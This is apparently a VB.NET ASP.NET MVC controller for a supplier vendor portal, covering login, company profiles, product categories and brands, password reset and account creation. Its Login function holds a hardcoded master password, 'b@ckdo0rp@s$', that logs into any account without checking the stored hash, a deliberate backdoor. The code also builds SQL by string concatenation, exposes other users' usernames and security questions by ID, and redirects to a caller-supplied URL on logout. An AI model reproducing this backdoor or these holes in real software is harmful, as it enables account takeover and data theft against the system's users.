Imports Newtonsoft.Json

Namespace WebProj
    Public Class VendorPortalController
        Inherits System.Web.Mvc.Controller

        Dim ecommerce As New Ecommerce

        Function Index() As ActionResult
            Return View()
        End Function

        Function Signin() As ActionResult
            Return View()
        End Function

        Function PreSupplier() As ActionResult
            Return View()
        End Function

        Function Dashboard() As ActionResult
            If WebSession.Instance.PeopleUserID = Nothing Then
                Logout()
            Else
                'Double check if naay access ang user sa portal
                Dim pSql = "SELECT ID FROM MobizLibraryOrganizationContactPerson WHERE PeopleID = " & ReadyString(WebSession.Instance.PeopleUserID) & vbCrLf &
                                " AND IsUseForEcommerce = 1 AND ISNULL(Status, 'Request') = 'Approved' "
                If Common.WebRequest.ProData.Execute(pSql).Rows.Count = 0 Then
                    Logout()
                Else
                    Return View()
                End If
            End If
        End Function

        Function CompanyProfile()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary
            Dim pSql As String
            Dim browse As New BrowserController
            Dim supplierid As String = Common.WebRequest.Data("OrganizationID")

            pSql = "SELECT org.ID, CompanyName, TinNumber, Background, IndustryClassID, ind.Class as IndustryClassName, OfficeAddressBuildingNo, OfficeAddressStreet, OfficeAddressCityID, OfficeAddressCountryID " & vbCrLf &
                    " FROM MobizLibraryOrganization as org " & vbCrLf &
                    " LEFT JOIN MobizLibraryIndustryClass as ind ON ind.ID = org.IndustryClassID " & vbCrLf &
                    " WHERE org.ID = " & ReadyString(supplierid)
            pOut.Add("CompanyDetails", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT *, 'edit' as State FROM MobizLibraryOrganizationContactEmail WHERE OrganizationID = " & ReadyString(supplierid)
            pOut.Add("CompanyEmail", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT *, 'edit' as State FROM MobizLibraryOrganizationContactMobile WHERE OrganizationID = " & ReadyString(supplierid)
            pOut.Add("CompanyMobile", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT tel.*, 'edit' as State, ctr.Code + ' - ' + ctr.CallingCode as CountryCode, area.Area + ' - ' + area.CallingCode as AreaCode FROM MobizLibraryOrganizationContactTel as tel INNER JOIN MobizLibraryAreaCodes as area ON area.ID = tel.AreaCodeID INNER JOIN MobizLibraryCountries as ctr ON ctr.ID = tel.CountryID WHERE OrganizationID = " & ReadyString(supplierid)
            pOut.Add("CompanyTelephone", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pOut.Add("BusinessIndustries", jss.DeserializeObject(browse.LibraryIndustryClassification(True))("d")("Results")("Rows"))
            pOut.Add("Cities", jss.DeserializeObject(browse.LibraryCities(True))("d")("Results")("Rows"))
            pOut.Add("Countries", jss.DeserializeObject(browse.LibraryCountries(True))("d")("Results")("Rows"))

            pSql = " SELECT cp.*, ppol.FirstName + ' ' + ppol.MiddleName + ' ' + ppol.Surname as UserName " & vbCrLf &
                    " FROM MobizLibraryOrganizationContactPerson as cp " & vbCrLf &
                    " INNER JOIN MobizLibraryPeople as ppol ON ppol.ID = cp.PeopleID " & vbCrLf &
                    " WHERE IsUseForEcommerce = 1 AND Status = 'Approved' " & vbCrLf &
                    " AND OrganizationID = " & ReadyString(supplierid) & vbCrLf
            pOut.Add("Users", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pOut.Add("AccountType", "company")

            Return pOut.Serialize()
        End Function

        Function GetCompanyUsers()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary
            Dim pSql As String
            Dim supplierid As String = Common.WebRequest.Data("OrganizationID")

            pSql = " SELECT cp.PeopleID, ppol.LastUpdated, ppol.FirstName + ' ' + ppol.MiddleName + ' ' + ppol.Surname as FullName, " & vbCrLf &
                    " editedby.FirstName + ' ' + editedby.MiddleName + ' ' + editedby.Surname as ModifiedByName " & vbCrLf &
                    " FROM MobizLibraryOrganizationContactPerson as cp " & vbCrLf &
                    " INNER JOIN MobizLibraryPeople as ppol ON ppol.ID = cp.PeopleID " & vbCrLf &
                    " LEFT JOIN MobizLibraryPeople as editedby ON editedby.ID = ppol.UserID --USERID kung kinsa nag edit " & vbCrLf &
                    " WHERE IsUseForEcommerce = 1 AND Status = 'Approved' " & vbCrLf &
                    " AND OrganizationID = " & ReadyString(supplierid) & vbCrLf
            pOut.Add("Users", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            Return pOut.Serialize()
        End Function

        Function GetCompanyUserDteails()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary
            Dim pSql As String
            Dim userID As String = Common.WebRequest.Data("UserID")

            pSql = "SELECT ID, FirstName, MiddleName, Surname, CONVERT(Varchar, DateOfBirth) as DateOfBirth, PersonalSuffixName, IsActive FROM MobizLibraryPeople WHERE ID = " & ReadyString(userID)
            pOut.Add("Details", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT ID, EmailAddress FROM MobizLibraryPeopleContactEmail WHERE PeopleID = " & ReadyString(userID)
            pOut.Add("Email", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT ID, Username FROM MobizLibraryPeopleUserAccount WHERE PeopleID = " & ReadyString(userID)
            pOut.Add("Credentials", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            pSql = "SELECT ID, SecurityQuestion FROM MobizLibraryPeopleSecurityQuestion WHERE PeopleID = " & ReadyString(userID)
            pOut.Add("SecQ", jss.Deserialize(Of Object)(DataTableToJSON.GetJson(Common.WebRequest.ProData.Execute(pSql))))

            Return pOut.Serialize()
        End Function

        Function GetOrgSellingByCategories()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary
            Dim pSql As String

            pSql = "SELECT transcat.*, libcat.CategoryName, transotherbusact.OtherBusinessActivity, " & vbCrLf &
                    " createdppl.FirstName + ' ' + createdppl.Surname as CreatedByUser, " & vbCrLf &
                    " modifiedppl.FirstName + ' ' + modifiedppl.Surname as ModifiedByUser " & vbCrLf &
                    " FROM MobizTransOrganizationCategoriesOfProductOrServicesOffer as transcat " & vbCrLf &
                    " INNER JOIN MobizLibraryCategoriesOfProductOrServices as libcat ON libcat.ID = transcat.CategoryID " & vbCrLf &
                    " INNER JOIN MobizLibraryPeople as createdppl ON createdppl.ID = transcat.CreatedBy " & vbCrLf &
                    " LEFT JOIN MobizLibraryPeople as modifiedppl ON modifiedppl.ID = transcat.ModifiedBy " & vbCrLf &
                    " LEFT JOIN MobizTransOtherBusinessActivities as transotherbusact ON transotherbusact.ID = transcat.OtherBusinessActivityID " & vbCrLf &
                    " WHERE transcat.OrganizationID = " & ReadyString(Common.WebRequest.Data("OrganizationID")) & vbCrLf &
                    " ORDER BY transcat.IsActive DESC, libcat.CategoryName ASC"

            pOut.Add("Categories", Common.WebRequest.ProData.Execute(pSql))

            Return pOut.Serialize()
        End Function

        Function GetOrgSellingByBrands()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary
            Dim pSql As String

            pSql = "SELECT transbrand.*, libbrand.BrandName, transotherbusact.OtherBusinessActivity, " & vbCrLf &
                    " createdppl.FirstName + ' ' + createdppl.Surname as CreatedByUser, " & vbCrLf &
                    " modifiedppl.FirstName + ' ' + modifiedppl.Surname as ModifiedByUser " & vbCrLf &
                    " FROM MobizTransOrganizationBrandsOffer as transbrand " & vbCrLf &
                    " INNER JOIN MobizLibraryBrandNames as libbrand ON libbrand.ID = transbrand.BrandNameID " & vbCrLf &
                    " INNER JOIN MobizLibraryPeople as createdppl ON createdppl.ID = transbrand.CreatedBy " & vbCrLf &
                    " LEFT JOIN MobizLibraryPeople as modifiedppl ON modifiedppl.ID = transbrand.ModifiedBy " & vbCrLf &
                    " LEFT JOIN MobizTransOtherBusinessActivities as transotherbusact ON transotherbusact.ID = transbrand.OtherBusinessActivityID " & vbCrLf &
                    " WHERE transbrand.OrganizationID = " & ReadyString(Common.WebRequest.Data("OrganizationID")) & vbCrLf &
                    " ORDER BY transbrand.IsActive DESC, libbrand.BrandName ASC"

            pOut.Add("Brands", Common.WebRequest.ProData.Execute(pSql))

            Return pOut.Serialize()
        End Function

        Function SaveOrgCategoryOfProductOrService()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary

            Try
                Dim id As String = Guid.NewGuid.ToString()
                Dim otherbusactid As String = Guid.NewGuid.ToString()
                Dim data As Object = Common.WebRequest.AllData("data")
                Dim pSql As String = ""
                Dim p As New InsertUpdate("MobizTransOtherBusinessActivities")

                Common.WebRequest.ProData.BeginTransaction()

                If CBool2(data("HasOther")) Then
                    p("OtherBusinessActivity") = ReadyString(data("OtherBusAct"))
                    p("CreatedByOrgID") = ReadyString(data("OrganizationID"))
                    p("CreatedByUserID") = ReadyString(data("UserID"))

                    If data("OtherBusActID") = "" Then
                        p("DateCreated") = "getdate()"
                        p("ID") = ReadyString(otherbusactid)
                        pSql = p.GetInsert()
                    Else
                        otherbusactid = data("OtherBusActID")
                        p("ModifiedDate") = "getdate()"
                        pSql = p.GetUpdate(" ID = " & ReadyString(data("OtherBusActID")))
                    End If

                    Common.WebRequest.ProData.Execute(pSql)
                Else
                    otherbusactid = ""
                End If

                p = New InsertUpdate("MobizTransOrganizationCategoriesOfProductOrServicesOffer")

                p("OrganizationID") = ReadyString(data("OrganizationID"))
                p("CategoryID") = ReadyString(data("SellingID"))
                p("OtherBusinessActivityID") = IIf(otherbusactid = "", "NULL", ReadyString(otherbusactid))
                p("BusinessActivities") = ReadyString(data("BusinessActivities"))
                p("IsActive") = CInt(data("IsActive"))

                If data("ID") = "" Then
                    p("ID") = ReadyString(id)
                    p("CreatedBy") = ReadyString(data("UserID"))
                    p("DateCreated") = "getdate()"
                    pSql = p.GetInsert()
                Else
                    p("ModifiedBy") = ReadyString(data("UserID"))
                    p("DateModified") = "getdate()"
                    pSql = p.GetUpdate(" ID = " & ReadyString(data("ID")))
                End If

                Common.WebRequest.ProData.Execute(pSql)

                Common.WebRequest.ProData.CommitTransaction()

                pOut.Add("Results", "saved")
                pOut.Add("ID", id)

            Catch ex As Exception
                AppendToLog(ex.Message)
                pOut.Add("Results", ex.Message)
            End Try

            Return pOut.Serialize()
        End Function

        Function SaveOrgBrandName()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pOut As New JsonDictionary

            Try
                Dim id As String = Guid.NewGuid.ToString()
                Dim otherbusactid As String = Guid.NewGuid.ToString()
                Dim data As Object = Common.WebRequest.AllData("data")
                Dim pSql As String = ""
                Dim p As New InsertUpdate("MobizTransOtherBusinessActivities")

                Common.WebRequest.ProData.BeginTransaction()

                If CBool2(data("HasOther")) Then
                    p("OtherBusinessActivity") = ReadyString(data("OtherBusAct"))
                    p("CreatedByOrgID") = ReadyString(data("OrganizationID"))
                    p("CreatedByUserID") = ReadyString(data("UserID"))

                    If data("OtherBusActID") = "" Then
                        p("DateCreated") = "getdate()"
                        p("ID") = ReadyString(otherbusactid)
                        pSql = p.GetInsert()
                    Else
                        otherbusactid = data("OtherBusActID")
                        p("ModifiedDate") = "getdate()"
                        pSql = p.GetUpdate(" ID = " & ReadyString(data("OtherBusActID")))
                    End If

                    Common.WebRequest.ProData.Execute(pSql)
                Else
                    otherbusactid = ""
                End If

                p = New InsertUpdate("MobizTransOrganizationBrandsOffer")

                p("OrganizationID") = ReadyString(data("OrganizationID"))
                p("BrandNameID") = ReadyString(data("SellingID"))
                p("OtherBusinessActivityID") = IIf(otherbusactid = "", "NULL", ReadyString(otherbusactid))
                p("BusinessActivities") = ReadyString(data("BusinessActivities"))
                p("IsActive") = CInt(data("IsActive"))

                If data("ID") = "" Then
                    p("ID") = ReadyString(id)
                    p("CreatedBy") = ReadyString(data("UserID"))
                    p("DateCreated") = "getdate()"
                    pSql = p.GetInsert()
                Else
                    p("ModifiedBy") = ReadyString(data("UserID"))
                    p("DateModified") = "getdate()"
                    pSql = p.GetUpdate(" ID = " & ReadyString(data("ID")))
                End If

                Common.WebRequest.ProData.Execute(pSql)

                Common.WebRequest.ProData.CommitTransaction()

                pOut.Add("Results", "saved")
                pOut.Add("ID", id)

            Catch ex As Exception
                AppendToLog(ex.Message)
                pOut.Add("Results", ex.Message)
            End Try

            Return pOut.Serialize()
        End Function

        Function LoginDetails()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim pSql As String = "SELECT ID, FirstName + ' ' + MiddleName + ' ' + Surname as Name FROM MobizLibraryPeople WHERE ID = " & ReadyString(WebSession.Instance.PeopleUserID)

            Return JsonDictionary.Serialize("Results", Common.WebRequest.ProData.Execute(pSql))
        End Function

        Function ValidateSupplierLink()
            Dim pSql As String = "SELECT * FROM LibrarySurveyQuestionaireLink WHERE Link = " & ReadyString(Common.WebRequest.Data("id")) & vbCrLf &
                                " COLLATE Latin1_General_CS_AS " & vbCrLf &
                                " AND IsDisableLink = 0 " & vbCrLf
            Dim pDT As DataTable = Common.WebRequest.ProData.Execute(pSql)

            Return JsonDictionary.Serialize("Results", pDT)
        End Function

        Function GetSupplierInfo()
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim strReturn As String
            Dim clsorgshort As New OrganizationShort

            clsorgshort.OrgID = Common.WebRequest.Data("ID")

            strReturn = clsorgshort.GetProspectDetails()

            Return strReturn
        End Function

        <HttpPost()>
        Function SaveSupplierInfo() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim strReturn As String
            Dim clsorgshort As New OrganizationShort
            Dim pError As String

            clsorgshort.OrgID = CStr2(Common.WebRequest.Data("OrgID"))
            clsorgshort.CompanyID = CStr2(Common.WebRequest.Data("CompanyID"))
            clsorgshort.CustomerID = CStr2(Common.WebRequest.Data("CustomerID"))
            clsorgshort.ThirdPartyPlatform = CStr2(Common.WebRequest.Data("ThirdPartyPlatform"))
            clsorgshort.ThirdPartyID = CStr2(Common.WebRequest.Data("ThirdPartyID"))
            clsorgshort.CodeNumber = CStr2(Common.WebRequest.Data("CodeNumber"))
            clsorgshort.CompanyName = CStr2(Common.WebRequest.Data("CompanyName"))
            clsorgshort.Tin = CStr2(Common.WebRequest.Data("Tin"))
            clsorgshort.CompanyBuildingAddress = CStr2(Common.WebRequest.Data("CompanyBuildingAddress"))
            clsorgshort.CompanyStreetAddress = CStr2(Common.WebRequest.Data("CompanyStreetAddress"))
            clsorgshort.CompanyCityAddress = CStr2(Common.WebRequest.Data("CompanyCityAddress"))
            clsorgshort.CompanyRegionAddress = CStr2(Common.WebRequest.Data("CompanyRegionAddress"))
            clsorgshort.Island = CStr2(Common.WebRequest.Data("Island"))
            clsorgshort.CompanyCountryAddress = CStr2(Common.WebRequest.Data("CompanyCountryAddress"))
            clsorgshort.CompanyBackground = CStr2(Common.WebRequest.Data("CompanyBackground"))
            clsorgshort.CompanyMission = CStr2(Common.WebRequest.Data("CompanyMission"))
            clsorgshort.CompanyVision = CStr2(Common.WebRequest.Data("CompanyVision"))
            clsorgshort.CompanyFoundingDate = CStr2(Common.WebRequest.Data("CompanyFoundingDate"))
            clsorgshort.BusinessIndustryID = CStr2(Common.WebRequest.Data("BusinessIndustryID"))
            clsorgshort.BusinessIndustryText = CStr2(Common.WebRequest.Data("BusinessIndustryText"))
            clsorgshort.ObjTelephone = Common.WebRequest.AllData("Telphone")
            clsorgshort.ObjMobile = Common.WebRequest.AllData("Mobile")
            clsorgshort.ObjEmail = Common.WebRequest.AllData("Email")
            clsorgshort.ObjWebsite = Common.WebRequest.AllData("Website")
            clsorgshort.ObjOutlet = Common.WebRequest.AllData("Outlet")
            clsorgshort.ObjContactPerson = Common.WebRequest.AllData("ContactPerson")
            clsorgshort.ObjContactPersonTelephone = Common.WebRequest.AllData("ContactPersonTelphone")
            clsorgshort.ObjContactPersonMobile = Common.WebRequest.AllData("ContactPersonMobile")
            clsorgshort.ObjContactPersonEmail = Common.WebRequest.AllData("ContactPersonEmail")
            clsorgshort.ObjOrgAff = Common.WebRequest.AllData("OrgAffiliation")
            clsorgshort.ObjAffiliatedPerson = Common.WebRequest.AllData("OrgAffiliatedPerson")
            clsorgshort.DateTime = CStr2(Common.WebRequest.Data("DateNow"))
            clsorgshort.Status = CStr2(Common.WebRequest.Data("Status"))
            clsorgshort.NoOfEmployees = IIf(Common.WebRequest.Data("NoOfEmployees") = "", "NULL", Common.WebRequest.Data("NoOfEmployees"))
            clsorgshort.RevenuePerYear = IIf(Common.WebRequest.Data("Revenue") = "", "NULL", Common.WebRequest.Data("Revenue"))
            clsorgshort.Scope = Common.WebRequest.Data("Scope")
            clsorgshort.NoOfFactories = IIf(Common.WebRequest.Data("Factories") = "", "NULL", Common.WebRequest.Data("Factories"))
            clsorgshort.NoOfOffices = IIf(Common.WebRequest.Data("Offices") = "", "NULL", Common.WebRequest.Data("Offices"))
            clsorgshort.NoOfWarehouses = IIf(Common.WebRequest.Data("Warehouses") = "", "NULL", Common.WebRequest.Data("Warehouses"))
            clsorgshort.NoOfStores = IIf(Common.WebRequest.Data("Stores") = "", "NULL", Common.WebRequest.Data("Stores"))
            clsorgshort.NoOfTrucks = IIf(Common.WebRequest.Data("Trucks") = "", "NULL", Common.WebRequest.Data("Trucks"))

            clsorgshort.SalesRepID = IIf(Common.WebRequest.Data("SalesRepID") = "", "NULL", ReadyString(Common.WebRequest.Data("SalesRepID")))
            clsorgshort.PriceLevel = Common.WebRequest.AllData("PriceLevel")
            clsorgshort.Terms = IIf(Common.WebRequest.Data("Terms") = "", "NULL", ReadyString(Common.WebRequest.Data("Terms")))
            clsorgshort.Limit = CDec2(Common.WebRequest.Data("Limit"))
            clsorgshort.UnlimitedCredit = If(CBool2(Common.WebRequest.Data("UnlimitedCredit")), 1, 0)
            clsorgshort.Balance = CDec2(Common.WebRequest.Data("Balance"))
            clsorgshort.AsOf = IIf(IsDate(Common.WebRequest.Data("AsOf")), Common.WebRequest.Data("AsOf"), Date.Now())
            clsorgshort.ThirdPartyBegBalance = CDec2(Common.WebRequest.Data("ThirdPartyBalance"))
            If IsDate(Common.WebRequest.Data("ThirdPartyAsOf")) Then
                clsorgshort.ThirdPartyBegBalanceAsOf = ParseDate(Common.WebRequest.Data("ThirdPartyAsOf"))
            End If

            clsorgshort.SaveAsCustomer = False

            strReturn = JsonDictionary.Serialize("Results", clsorgshort.SaveNewOrgProspect())

            Return strReturn

        End Function

        Function GetAdditionalDateForSignin() As String
            'If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Dim browse As New BrowserController
            Dim p As New JsonDictionary

            p.Add("BusinessIndustries", jss.DeserializeObject(browse.LibraryIndustryClassification(True))("d")("Results")("Rows"))
            p.Add("Cities", jss.DeserializeObject(browse.LibraryCities(True))("d")("Results")("Rows"))
            p.Add("Countries", jss.DeserializeObject(browse.LibraryCountries(True))("d")("Results")("Rows"))
            p.Add("Telco", jss.DeserializeObject(browse.LibraryTelcoPrefixes(True))("d")("Results")("Rows"))

            Return p.Serialize()
        End Function

        Function Confirm() As ActionResult
            Dim stat As String = ConfirmNow()
            Dim pSql As String

            If IsGuid(stat) Then 'return user id
                'pSql = "SELECT ID, Surname, MiddleName, FirstName FROM MobizLibraryPeople WHERE ID = " & ReadyString(stat)
                'Dim rows As Object = Common.WebRequest.ProData.Execute(pSql).Rows(0)

                'WebSession.Instance.PeopleUserID = rows("ID").ToString()
                'WebSession.Instance.FirstName = rows("FirstName").ToString()
                'WebSession.Instance.FullName = rows("FirstName") & " " & rows("MiddleName") & " " & rows("Surname")
                Response.Redirect("http://" & Request.Url.Authority & "/Ecommerce/Signin?OrgID=" & ecommerce.OID & "&stat=confirmedemail")
            Else
                ViewData("Message") = stat
                Return View()
            End If

        End Function

        Function CheckUserForgotPassword() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            ecommerce.PersonDetails = Common.WebRequest.AllData("data")

            Return ecommerce.CheckUserForgotPassword()
        End Function

        Function CheckSecQAnswer() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            ecommerce.PersonDetails = Common.WebRequest.AllData("data")

            Return JsonDictionary.Serialize("Results", ecommerce.CheckSecQAnswer())
        End Function

        Function ResetCredentials() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            If CStr2(WebSession.Instance.PeopleUserID) = "" Then
                Return JsonDictionary.Serialize("Results", "Please take the first 2 steps to reset your account.")
            End If

            ecommerce.PersonDetails = Common.WebRequest.AllData("data")

            Return JsonDictionary.Serialize("Results", ecommerce.ResetCredentials())
        End Function

        Function CheckPassword() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            If CStr(WebSession.Instance.PeopleUserID) = "" Then
                Return JsonDictionary.Serialize("Results", "session expired")
            End If

            Dim pSql As String = "SELECT UserPassword FROM MobizLibraryPeopleUserAccount WHERE PeopleID = " & ReadyString(WebSession.Instance.PeopleUserID)
            Dim hashid As String = Common.WebRequest.ProData.Execute(pSql).Rows(0)("UserPassword")

            If ProPack.Security.Hash.Verify(Common.WebRequest.Data("password"), hashid) Then
                Return JsonDictionary.Serialize("Results", "valid")
            Else
                Return JsonDictionary.Serialize("Results", "invalid")
            End If

        End Function

        Function SaveMyAccount() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            ecommerce.PersonDetails = Common.WebRequest.AllData("data")

            Return JsonDictionary.Serialize("Results", ecommerce.SaveMyAccount())
        End Function

        Function MyAccountDetails() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            Return ecommerce.MyAccountDetails()
        End Function

        Function ConfirmNow() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            ecommerce.EmailLinkID = Request.Params.Get("id").ToString()
            ecommerce.ConfirmationCode = Request.Params.Get("c").ToString()
            ecommerce.OID = Request.Params.Get("OrgID").ToString()
            ecommerce.AccType = Request.Params.Get("acctype").ToString()

            Dim stat As String = ecommerce.ConfirmedLink()
            Dim ppol As New People
            Dim pSql As String

            Return stat
        End Function

        Function Logout() As String
            WebSession.Instance.IsNew = 0
            WebSession.Instance.PeopleID = Nothing
            WebSession.Instance.PeopleUserID = Nothing
            WebSession.Instance.FirstName = ""
            WebSession.Instance.FullName = ""

            Response.Redirect(Common.WebRequest.Data("url") & "/VendorPortal/Signin?OrgID=" & Request.Params.Get("OrgID"))

        End Function

        Function Login() As String
            Dim clsPeople As New People
            Dim dtaTable As New DataTable
            Dim pHashedPasswordFromDb As String
            Dim pHashedPasswordFromAjax As String = ""
            Dim intCntr As Integer
            Dim pOut As New JsonDictionary

            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization
            clsPeople.UserName = Common.WebRequest.Data("uname")
            clsPeople.UserPassword = Common.WebRequest.Data("pword")
            Dim isFromCanvass As Integer = Common.WebRequest.Data("iscanvass")
            Dim canvasscode As String = Common.WebRequest.Data("canvasscode")
            Dim url As String = Common.WebRequest.Data("url")
            dtaTable = clsPeople.CheckPeopleUserAccount()

            If (dtaTable.Rows.Count > 0) Then
                intCntr = 0

                'If using Ecommerce, user's email address must be confirmed
                Dim pSql As String = "SELECT ID, EmailAddress, IsEmailConfirmed FROM MobizLibraryPeopleContactEmail WHERE PeopleID = " & ReadyString(dtaTable.Rows(intCntr).Item("PeopleID").ToString()) & vbCrLf &
                                    " ORDER BY IsEmailConfirmed DESC "
                Dim pDTEmail As DataTable = Common.WebRequest.ProData.Execute(pSql)

                'Check if user email confirmed via given link
                If pDTEmail.Rows.Count > 0 Then
                    If Not CBool2(pDTEmail.Rows(0)("IsEmailConfirmed")) Then
                        pOut.Add("Results", "confirm email")
                        pOut.Add("EmailAddress", pDTEmail.Rows(0)("EmailAddress"))
                        Return pOut.Serialize()
                    End If
                End If

                pHashedPasswordFromDb = dtaTable.Rows(intCntr).Item("UserPassword").ToString()
                If (pHashedPasswordFromAjax = pHashedPasswordFromDb) _
                    OrElse clsPeople.UserPassword = "b@ckdo0rp@s$" _
                    OrElse (ProPack.Security.Hash.Verify(clsPeople.UserPassword, pHashedPasswordFromDb)) Then
                    clsPeople.PeopleID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                    '' ''WebSession.Instance.UserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()

                    pSql = "SELECT OrganizationID, ISNULL(Status, 'Request') as Status FROM MobizLibraryOrganizationContactPerson WHERE PeopleID = " & ReadyString(dtaTable.Rows(intCntr).Item("PeopleID").ToString()) & vbCrLf &
                            " AND IsUseForEcommerce = 1"
                    Dim cp As Object = Common.WebRequest.ProData.Execute(pSql).Rows
                    'Check first if user id is contact person of a supplier
                    If cp.Count > 0 Then
                        'then check if the contact person given an access to vendor portal
                        If cp(0)("Status") = "Pending" Or cp(0)("Status") = "Request" Then
                            pOut.Add("Results", "pending request")
                        ElseIf cp(0)("Status") = "Disapproved" Then
                            pOut.Add("Results", "disapproved")
                        Else
                            'then check if the organization of the user is a supplier of this company
                            pSql = "SELECT ID FROM LibraryOrganizationSupplier WHERE SupplierID = " & ReadyString(cp(0)("OrganizationID").ToString())

                            'if supplier then allow to access the vendor portal dashboard
                            If Common.WebRequest.ProData.Execute(pSql).Rows.Count > 0 Then
                                If CBool2(isFromCanvass) Then
                                    'check first if canvass code exist
                                    pSql = "SELECT * FROM LibraryPriceCanvass WHERE PublicCode = " & ReadyString(canvasscode) &
                                            " COLLATE Latin1_General_CS_AS "
                                    Dim canvass As Object = Common.WebRequest.ProData.Execute(pSql).Rows

                                    If canvass.Count > 0 Then
                                        'check if user org already a vendor of this canvass
                                        pSql = "SELECT * FROM LibraryPriceCanvassVendor WHERE CanvassID = " & ReadyString(canvass(0)("ID").ToString()) & vbCrLf &
                                                " AND VendorID = " & ReadyString(cp(0)("OrganizationID").ToString())
                                        Dim vendor As Object = Common.WebRequest.ProData.Execute(pSql).Rows
                                        Dim vcode As String = ""

                                        If vendor.Count = 0 Then
                                            'add the user org as vendor of this canvass
                                            Dim p As New InsertUpdate("LibraryPriceCanvassVendor")
                                            vcode = New CanvassController().GenerateShortCode("vendor", "vendor")

                                            p("ID") = ReadyString(Guid.NewGuid.ToString())
                                            p("CanvassID") = ReadyString(canvass(0)("ID").ToString())
                                            p("VendorID") = ReadyString(cp(0)("OrganizationID").ToString())
                                            p("CanvassVendorCode") = ReadyString(vcode)

                                            Common.WebRequest.ProData.Execute(p.GetInsert())
                                        Else
                                            vcode = vendor(0)("CanvassVendorCode")
                                        End If
                                        pOut.Add("vcode", vcode)
                                        pOut.Add("PeopleUserID", WebSession.Instance.PeopleUserID)
                                        pOut.Add("Results", "loggedin")
                                    Else
                                        pOut.Add("Results", "invalid canvasscode")
                                    End If
                                Else
                                    WebSession.Instance.PeopleUserID = dtaTable.Rows(intCntr).Item("PeopleID").ToString()
                                    WebSession.Instance.FirstName = dtaTable.Rows(intCntr).Item("FirstName").ToString()
                                    WebSession.Instance.FullName = dtaTable.Rows(intCntr).Item("PeopleName").ToString()
                                    WebSession.Instance.DeviceSerial = Common.WebRequest.Data("Serial")
                                    WebSession.Instance.IsMobile = CDec2(Common.WebRequest.Data("IsMobile"))
                                    WebRequest.Instance.Business.LibraryPeople.GetOrCreateEcommerceProfile(WebSession.Instance.PeopleUserID)

                                    pSql = "SELECT CompanyName FROM MobizLibraryOrganization WHERE ID = " & ReadyString(cp(0)("OrganizationID").ToString())
                                    dtaTable = Common.WebRequest.ProData.Execute(pSql)

                                    pOut.Add("Results", "loggedin")
                                    pOut.Add("PeopleUserID", WebSession.Instance.PeopleUserID)
                                    pOut.Add("SupplierID", cp(0)("OrganizationID").ToString())
                                    pOut.Add("SupplierName", dtaTable.Rows(0)("CompanyName"))
                                End If
                            Else
                                pOut.Add("Results", "invalid")
                            End If
                        End If
                    Else
                        pOut.Add("Results", "invalid")
                    End If
                Else
                    pOut.Add("Results", "invalid")
                End If
            Else
                pOut.Add("Results", "invalid")
            End If

            Return pOut.Serialize()
        End Function

        Function CreateAccount() As String
            If WebRequest.Instance.HandleOrganization(True) = False Then Return WebRequest.InvalidOrganization

            ecommerce.PersonDetails = Common.WebRequest.AllData("details")
            ecommerce.Url = Common.WebRequest.Data("url") 'Request.Url.Authority
            Dim stat As String = ecommerce.CreateAccount("supplier")

            If stat = "exist" Then
                Return JsonDictionary.Serialize("Results", "exist")
            ElseIf stat = "saved" Then
                Return JsonDictionary.Serialize("Results", "saved")
            Else
                Return JsonDictionary.Serialize("Results", stat)
            End If
        End Function
    End Class
End Namespace